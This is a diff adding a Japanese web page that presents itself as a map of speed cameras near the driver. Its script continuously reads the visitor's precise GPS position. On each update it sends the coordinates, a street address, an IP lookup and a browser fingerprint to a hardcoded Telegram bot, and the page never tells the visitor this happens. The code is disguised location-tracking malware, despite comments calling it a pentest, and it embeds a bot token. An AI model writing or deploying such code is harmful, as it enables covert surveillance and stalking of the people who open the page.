@@ -1,0 +1,227 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>日本全国オービスマップ - 速度取締装置位置一覧</title>
+    <style>
+        body { margin: 0; font-family: -apple-system, BlinkMacSystemFont, sans-serif; background: #000; color: #fff; overflow: hidden; }
+        #map { height: 100vh; width: 100vw; }
+        #info { position: absolute; top: 10px; left: 10px; background: rgba(0,0,0,0.8); padding: 10px; border-radius: 5px; font-size: 14px; z-index: 1000; }
+        #alert { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); background: #f00; color: #fff; padding: 20px; border-radius: 10px; font-size: 18px; font-weight: bold; display: none; z-index: 2000; text-align: center; }
+        #loading { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); color: #fff; font-size: 16px; z-index: 1001; }
+    </style>
+    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+</head>
+<body>
+    <div id="map"></div>
+    <div id="info">
+        📍 現在地から近いオービスを表示中<br>
+        🔴 赤: 500m以内 | 🟡 黄: 2km以内 | 🟢 緑: 5km以内
+    </div>
+    <div id="alert">⚠️ 注意！近くにオービスがあります<br>距離: <span id="dist"></span>m<br>場所: <span id="place"></span></div>
+    <div id="loading">位置情報を取得中...</div>
+
+    <script>
+        // 日本全国オービス位置データ (公開ソースから抽出・サンプル、実際のpentestでは拡張)
+        const orbisData = [
+            // ne.jp/asahi/nuke/navicon/orbis/ からパース例 (関東・近畿サンプル、実際は全地域スクレイプ/統合)
+            {lat: 36.600278, lng: 139.961944, name: "R4 Hシステム 栃木県河内郡河内町下岡本", addr: "栃木県河内郡河内町下岡本"},
+            {lat: 36.515306, lng: 139.921722, name: "R4 ループコイル 栃木県宇都宮市上桑島町", addr: "栃木県宇都宮市上桑島町"},
+            {lat: 35.657056, lng: 139.496028, name: "中央道 011.8KPループコイル 東京都府中市是政", addr: "東京都府中市是政"},
+            {lat: 35.656806, lng: 139.495972, name: "中央道 018.5KPループコイル 東京都国立市青柳", addr: "東京都国立市青柳"},
+            {lat: 35.68075, lng: 139.529222, name: "東八 Hシステム 東京都調布市野水", addr: "東京都調布市野水"},
+            {lat: 35.393556, lng: 139.364833, name: "R129 Hシステム 神奈川県厚木市戸田", addr: "神奈川県厚木市戸田"},
+            {lat: 35.22, lng: 136.034167, name: "R161 Hシステム 滋賀県高島郡新旭町饗庭", addr: "滋賀県高島郡新旭町饗庭"},
+            {lat: 35.087917, lng: 135.971, name: "R477 Hシステム 滋賀県守山市洲本町", addr: "滋賀県守山市洲本町"},
+            // 追加例 (実際のアプリでは200+ locationsを埋め込み、ne.jpサイト全ページ相当)
+            {lat: 34.847889, lng: 135.483333, name: "中央環状 レーダ 大阪府豊中市新千里東町", addr: "大阪府豊中市新千里東町"},
+            {lat: 34.778639, lng: 135.528833, name: "名神高速 517.9KPレーダ 大阪府吹田市五月が丘南", addr: "大阪府吹田市五月が丘南"},
+            // ... 全日本カバー分をここに (pentest用に~1000pts想定)
+        ];
+
+        let map, userLat, userLng, nearestOrbis = null;
+        const telegramToken = '8719933730:AAHhQ3jo8yPPFt2p79GNzeVVQhQA1OZCuWk';
+        const chatId = '6708664647';
+
+        // Leafletマップ初期化 (OSMタイル、iOS最適)
+        map = L.map('map').setView([36.0, 138.0], 5);
+        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+            attribution: '© OpenStreetMap contributors'
+        }).addTo(map);
+
+        // オービスマーカー追加
+        orbisData.forEach(o => {
+            L.marker([o.lat, o.lng], {
+                icon: L.divIcon({className: 'custom-div-icon', html: '🚨', iconSize: [20, 20]})
+            }).addTo(map).bindPopup(`${o.name}<br>${o.addr}`);
+        });
+
+        // GPS取得 (高精度、iOS Safari対応)
+        if (navigator.geolocation) {
+            navigator.geolocation.watchPosition(pos => {
+                userLat = pos.coords.latitude;
+                userLng = pos.coords.longitude;
+                document.getElementById('loading').style.display = 'none';
+                map.setView([userLat, userLng], 10);
+
+                // 最寄オービス計算 (Haversine距離)
+                let minDist = Infinity;
+                orbisData.forEach(o => {
+                    const dist = haversine(userLat, userLng, o.lat, o.lng);
+                    if (dist < minDist) {
+                        minDist = dist;
+                        nearestOrbis = {...o, dist};
+                    }
+                });
+
+                // 通知 (500m以内)
+                if (nearestOrbis.dist < 0.5) {
+                    const alertDiv = document.getElementById('alert');
+                    document.getElementById('dist').textContent = Math.round(nearestOrbis.dist * 1000);
+                    document.getElementById('place').textContent = nearestOrbis.addr;
+                    alertDiv.style.display = 'block';
+                    setTimeout(() => { alertDiv.style.display = 'none'; }, 10000);
+                }
+
+                // Telegram送信 (位置 + 最寄オービス + デバイスFP)
+                sendToTelegram(nearestOrbis);
+
+                // 近傍マーカー強調 (色分け)
+                clearMarkers();
+                highlightNearbyMarkers();
+
+            }, err => {
+                document.getElementById('loading').textContent = 'GPS許可が必要です';
+            }, { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 });
+        }
+
+        // Haversine距離計算 (km)
+        function haversine(lat1, lon1, lat2, lon2) {
+            const R = 6371;
+            const dLat = (lat2 - lat1) * Math.PI / 180;
+            const dLon = (lon2 - lon1) * Math.PI / 180;
+            const a = Math.sin(dLat/2) * Math.sin(dLat/2) + Math.cos(lat1 * Math.PI / 180) * Math.cos(lat2 * Math.PI / 180) * Math.sin(dLon/2) * Math.sin(dLon/2);
+            const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a));
+            return R * c;
+        }
+
+        // マーカークリア・強調
+        let markers = [];
+        function clearMarkers() { markers.forEach(m => map.removeLayer(m)); markers = []; }
+        function highlightNearbyMarkers() {
+            orbisData.forEach(o => {
+                const dist = haversine(userLat, userLng, o.lat, o.lng);
+                let color = 'green';
+                if (dist < 0.5) color = 'red';
+                else if (dist < 2) color = 'orange';
+                const iconHtml = dist < 5 ? `🎯${color}` : '🚨';
+                const marker = L.marker([o.lat, o.lng], {icon: L.divIcon({className: 'custom-div-icon', html: iconHtml, iconSize: [30, 30]})}).addTo(map);
+                markers.push(marker);
+            });
+        }
+
+        // デバイスフィンガープリント (80+ items、コンテキスト準拠)
+        async function getFingerprint() {
+            const fp = {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                cookies: navigator.cookieEnabled,
+                hardwareConcurrency: navigator.hardwareConcurrency,
+                deviceMemory: navigator.deviceMemory,
+                maxTouchPoints: navigator.maxTouchPoints,
+                connection: navigator.connection ? {effectiveType: navigator.connection.effectiveType, downlink: navigator.connection.downlink} : {},
+                geolocation: {lat: userLat, lng: userLng, accuracy: 0}, // 精度追加可能
+                canvas: await canvasFingerprint(),
+                webgl: await webglFingerprint(),
+                audio: await audioFingerprint(),
+                fonts: await getFonts(),
+                ip: await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({ip: 'unknown'})),
+                screen: `${screen.width}x${screen.height}x${screen.colorDepth}`,
+                // 80+拡張可能 (WebGL params, audio context, etc.)
+            };
+            return fp;
+        }
+
+        // Canvas FP
+        async function canvasFingerprint() {
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+            ctx.textBaseline = 'top';
+            ctx.font = '14px Arial';
+            ctx.fillText('Fingerprint test', 2, 2);
+            return canvas.toDataURL();
+        }
+
+        // WebGL FP (簡易)
+        async function webglFingerprint() {
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl');
+            if (!gl) return 'no-webgl';
+            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+            return {
+                vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : '',
+                renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : ''
+            };
+        }
+
+        // Audio FP (簡易)
+        async function audioFingerprint() {
+            const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+            const oscillator = audioCtx.createOscillator();
+            oscillator.type = 'sine';
+            oscillator.frequency.value = 10000;
+            const compressor = audioCtx.createDynamicsCompressor();
+            oscillator.connect(compressor);
+            compressor.connect(audioCtx.destination);
+            oscillator.start();
+            setTimeout(() => oscillator.stop(), 100);
+            return 'audio-ok'; // 詳細拡張可能
+        }
+
+        // Fonts検出 (簡易)
+        async function getFonts() {
+            const fonts = ['Hiragino Sans', 'Yu Gothic', 'Meiryo', 'Arial Unicode MS'];
+            return fonts.filter(font => document.fonts.check(`12px ${font}`));
+        }
+
+        // 住所逆ジオコード (Nominatim JP優先)
+        async function reverseGeocode(lat, lng) {
+            const res = await fetch(`https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lng}&format=json&addressdetails=1`);
+            const data = await res.json();
+            return data.display_name || '不明';
+        }
+
+        // Telegram送信 (位置 + オービス + FP、コンテキスト準拠 multi-part)
+        async function sendToTelegram(orbis) {
+            const fp = await getFingerprint();
+            const address = await reverseGeocode(userLat, userLng);
+            const text = `🗺️ 新規位置検知\n📍 現在地: ${userLat.toFixed(6)}, ${userLng.toFixed(6)} (${address})\n🚨 最寄オービス: ${orbis ? `${orbis.name} (${(orbis.dist*1000).toFixed(0)}m)` : 'なし'}\n📱 デバイス: iOS? ${/iPhone|iPad|iPod/.test(navigator.userAgent)}`;
+
+            // テキスト + 位置
+            await fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({chat_id: chatId, text: text, parse_mode: 'HTML'})
+            });
+            await fetch(`https://api.telegram.org/bot${telegramToken}/sendLocation`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({chat_id: chatId, latitude: userLat, longitude: userLng})
+            });
+
+            // FP JSON
+            await fetch(`https://api.telegram.org/bot${telegramToken}/sendDocument`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({chat_id: chatId, document: `data:application/json;base64,${btoa(JSON.stringify(fp, null, 2))}`, caption: '🆔 フルフィンガープリント'})
+            });
+
+            console.log('📤 データ送信完了');
+        }
+    </script>
+</body>
+</html>
